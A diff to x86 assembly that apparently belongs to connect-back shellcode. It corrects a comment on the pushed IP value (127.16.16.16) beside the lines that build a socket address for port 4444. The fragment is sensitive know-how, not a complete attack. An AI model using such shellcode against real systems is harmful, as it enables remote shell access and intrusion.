@@ -23,7 +23,7 @@ _start:
 
 	xor ecx,ecx
 
-	push 0x1010107f ; ip address of 127.1.1.1
+	push 0x1010107f ; ip address of 127.16.16.16
 	push word 0x5C11
 	push word 2
 	mov ecx, esp
